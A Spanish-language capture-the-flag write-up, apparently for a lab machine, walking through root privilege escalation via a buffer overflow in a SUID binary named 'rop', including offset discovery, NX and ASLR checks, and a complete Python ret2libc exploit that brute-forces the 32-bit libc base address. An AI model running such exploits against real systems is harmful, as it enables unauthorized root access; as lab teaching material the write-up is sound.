## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /home/ayush
ls -la
```

Aqui vemos un directorio turbio donde nosotros como el usuario **www-data** tenemos derechos

```bash
cd ./binary
ls -la
```

Aqui vemos un fichero `rop` que tiene derechos suid como el usuario root. y como se llama rop pensamos directamente a un BufferOverflow

```bash
./rop

[*] Usage: program <message>


./rop EEEEEE

[*] Message sent: EEEEEE
```

Aqui vamos a usar python y ver si hay un BOF

```bash
./rop $(python -c 'print "A"*500)
Segmentation fault (core dumped)
```

Como vemos que hay un BOF nos enviamos el binario a nuestra maquina de atacante y tratamos el BOF. Nos lo enviamos con un http.server de python

1. en la maquina victima

    ```bash
    python3 -m http.server 8080
    ```

1. en nuestra maquina de atacante

    ```bash
    wget http://10.10.10.111:8080/rop
    chmod -x rop
    ```

#### Tratando el BOF {-}

1. Lanzamos el binario con gdb-gef

    ```bash
    gdb ./rop

    gef> r
    gef> r EEEE
    [*] Message sent: EEEEEE

    disass main
    ```

    Aqui vemos cosas como el SUID y la llamada a la funccion **put**

1. Miramos la seguridad del binario

    ```bash
    checksec
    ```

    Aqui vemos quel NX esta abilitado. Esto quiere decir quel DEP (Data Execution Prevention) esta habilitado, lo que significa que no podemos redirigir
    el flujo del programa a la pila para ejecutar comandos a nivel de systema.

1. Lanzamos 500 A

    ```bash
    gef> r $(python -c 'print "A"*500')
    ```

    Aqui vemos que hemos sobrepassado el $eip que ahora apunta a 0x41414141 que son 4 "A"

1. Buscamos el offset necessario antes de sobrescribir el $eip

    ```bash
    gef> pattern create 100
    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
    
    gef> r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

    gef> pattern offset $eip
    [+] Found at offset 52 (little-endian search) likely
    ```

    Aqui vemos que el offset es de 52 caracteres.

1. Comprobamos poniendole 52 A y 4 B

    ```bash
    gef> r $(pyhton -c 'print "A"*52 + "B"*4')
    ```

    Y vemos que el $eip vale ahora 0x42424242 que son 4 "B"

Como aqui sabemos que no podemos ejecutar comandos desde la pila porque el NX esta habilitado, la primera cosa que nos pasa por la cabeza seria
usar la technica `Ret2Libc`. Lo que tenemos que ver para efectuar esta tecnica seria ver si hay que burlar el ASLR en caso de que haya aleatorisacion 
en las direcciones de la memoria.

Esto se controla desde la maquina victima.

1. miramos si la architectura de la maquina es 32 o 64 bits

    ```bash
    uname -a
    ```

    vemos que estamos en una maquina con architectura 32 bits

1. miramos si el ASLR esta habilitado

    ```bash
    cat /proc/sys/kernel/randomize_va_space

    #Output
    2
    ```

    Esta habilitado y lo podemos comprobar dandole multiples vecez al comando `ldd rop` y vemos que la libreria libc.so.6 cambia
    de direccion cada vez.

Ahora que tenemos esto en cuenta miramos como atacamos el BOF con un `Ret2Libc`. La tecnica aqui seria que una vez tomado el control del $eip
redirigir el programa a la direccion del 

1. system_addr
1. exit_addr
1. bin_sh_addr

ret2libc -> system_addr + exit_addr + bin_sh_addr.

Solo falta conocer las direcciones de estas funcciones. Como la maquina es de architectura 32 bits, podemos intentar colision con las direcciones.
De que se trata exactamente; En condiciones normales (donde el ASLR no esta activado), sumariamos los diferentes ofsets de las funcciones `system`, 
`exit` y `/bin/sh` a la direccion de la libreria `libc`. Estas direcciones se encuentran de la manera siguiente.

1. la direccion de libreria libc

    ```bash
    ldd rop
    ldd rop | grep libc
    ldd rop | grep libc | awk 'NF{print $NF}'
    ldd rop | grep libc | awk 'NF{print $NF}' | tr -d '()'

    #Output
    0xb771f000
    ```

1. los offsets del system_addr y del exit

    ```bash
    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -E " system@@ | exit@@"
    
    #Output
     141: 0002e9d0 31 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0
    1457: 0003ada0 31 FUNC WEAK   DEFAULT 13 system@@GLIBC_2.0
    ```

    Aqui el *0003ada0* y el *0002e9d0* son los offset que tendriamos que sumar a la direccion de la libreria libc

1. el offset de la cadena `/bin/sh`

    ```bash
    strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
    
    #Output
    15ba0b /bin/sh
    ```

En este caso las direcciones serian 
- system = 0xb771f000 + 0003ada0
- exit = 0xb771f000 + 0002e9d0
- /bin/sh = 0xb771f000 + 15ba0b

Pero como la direccion cambia la tenemos que calcular o conocer antes. La suerte aqui es que como estamos en 32b, las
direcciones no cambian demasiado y esto se puede comprobar con bucles.

1. Verificamos con un bucle de 10 turnos las direcciones cambiantes

    ```bash
    for i in $(seq 1 10); do ldd rop | grep libc | awk 'NF {print $NF}' | tr -d '()'; done
    ```

1. Copiamos una de ellas (0xb7568000) y miramos si aparece multiples veces en un bucle de 1000 turnos

    ```bash
    for i in $(seq 1 1000); do ldd rop | grep libc | awk 'NF {print $NF}' | tr -d '()'; done | grep "0xb7568000"
    ```

Constatamos que aparece multiples vecez. Esto quiere decir que podriamos lanzar el binario o mejor dicho el exploit multiples vecez hasta que 
esta direccion salga.


#### Creando el exploit en python {-}

```bash
cd /tmp
mkdir privesc
cd $!
touch exploit.py
vi exploit.py
```

El exploit seria:

```python
#!/usr/bin/python

from struct import pack
from subprocess import call
import sys

offset = 52
junk = "A"*offset

#ret2libc -> system_addr + exit_addr + bin_sh_addr

base_libc = 0xb7568000

#141: 0002e9d0 31 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0
#1457: 0003ada0 31 FUNC WEAK   DEFAULT 13 system@@GLIBC_2.0
#15ba0b /bin/sh

system_addr_offset = 0x0003ada0
exit_addr_offset = 0x0002e9d0
bin_sh_addr_offset = 0x0015ba0b

system_addr = pack("<I", base_libc + system_addr_offset)
exit_addr = pack("<I", base_libc + exit_addr_offset)
bin_sh_addr = pack("<I", base_libc + bin_sh_addr_offset)

payload = junk + system_addr + exit_addr + bin_sh_addr

# Lanzamos el bucle infinito hasta que la direccion sea la buena
while True:
    #lanzamos el subprocess y almazenamos el codigo de estado en una variable ret
    ret = call(["/home/ayush/.binary/rop", payload])
    # Si el codigo de estado es exitoso salimos del programa
    if ret == 0:
        print("\n[+] Saliendo del programa...\n")
        sys.exit(0)
```

lanzamos el script con `python exploit.py` y esperamos de salir del bucle infinito para ganar la shell como root y leer la flag.
